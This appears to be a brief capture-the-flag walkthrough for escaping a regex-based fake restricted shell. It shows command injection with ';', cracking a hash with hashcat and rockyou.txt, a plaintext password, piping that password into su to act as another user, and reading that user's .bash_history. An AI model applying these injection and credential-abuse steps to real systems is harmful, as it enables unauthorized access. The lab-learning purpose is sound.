> From the python script you can tell that it's not really rbash but just a regex and if statement that is decides if you can run the command, so you can break it with command;ls {any command};{valid command}

> From the output I now see the hash ðŸ¤¡

> Use rockyou.txt with hashcat
> password: zenisluffy

> From the script you can also su doesn't work because of Popen
> So you gotta use echo to parse to password to su
> echo zenisluffy | su -c "whoami" notroot

> Check the home directory of notroot and you see .bash_history
> echo zenisluffy | su -c "cat /home/notroot/.bash_history" notroot
